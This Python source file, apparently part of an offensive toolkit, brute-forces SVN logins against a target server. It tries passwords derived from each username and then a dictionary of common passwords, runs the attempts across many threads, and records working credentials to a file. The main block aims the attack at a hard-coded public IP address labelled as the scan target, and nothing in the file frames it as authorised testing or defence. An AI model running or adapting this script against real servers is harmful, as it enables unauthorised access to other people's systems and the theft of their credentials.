import time

from conf.conf import base_root
from lib.file.file_Class import readFile,writeFile
from lib.net.connect_svn import connect_svn
from module.pwdCrack import getUserNameAlikePwd
from lib.core.w_threadPool import MyThreadPool

def weakPwdCrack_Svn(ip,user_list=None,pwd_list=None,resultFile=None):
    if resultFile == None:
        resultFile = '{}result/{}_{}.txt'.format(base_root,ip,time.time())

    if user_list == None:
        user_list = readFile('{}payload/dict/user_database.txt'.format(base_root))

    if pwd_list == None:
        pwd_list = readFile('{}payload/dict/passwd_top10.txt'.format(base_root))

    #生成在多线程里使用的关键函数
    def connectSvn_forThread(passwd,otherArgs):
        ip = otherArgs['ip']
        user = otherArgs['user']
        passwd = passwd.strip()
        print('crack user:[{}]/pwd:[{}]'.format(user, passwd))
        (flag, userAndpwd) = connect_svn(ip,user,password=passwd)
        if flag:
            print('[FOUND] user:[{}]/pwd:[{}],result out is [{}]'.format(user, passwd,userAndpwd))
            time.sleep(1.5)  # 多线程写入文件时，可能存在条件竞争，添加睡眠时间尽可能防止其出现
            writeFile(resultFile, '[user:[{}]/pwd:[{}]\r\n'.format(user, passwd))
            time.sleep(1.5)  # 多线程写入文件时，可能存在条件竞争，添加睡眠时间尽可能防止其出现

    #爆破和用户名相似的密码
    for user in user_list:
        user = user.strip()
        userNameAlikePwd = getUserNameAlikePwd(user)
        otherArgs = {'ip': ip, 'user': user}
        crackFtpThread = MyThreadPool(connectSvn_forThread, userNameAlikePwd, other_args=otherArgs)
        crackFtpThread.start()

    # 爆破字典里面的密码
    for user in user_list:
        user = user.strip()
        otherArgs = {'ip':ip,'user':user}
        crackFtpThread = MyThreadPool(connectSvn_forThread,pwd_list,other_args=otherArgs)
        crackFtpThread.start()

if __name__ == '__main__':
    last_time = time.time()
    # pwd_list = readFile('{}payload/dict/passwd_1w.txt'.format(base_root))
    pwd_list = readFile('{}payload/dict/passwd_top10.txt'.format(base_root))
    ip = '167.88.178.54'  # 扫描目标
    weakPwdCrack_Svn(ip,pwd_list=pwd_list)
    print('total time is {}'.format(time.time() - last_time))
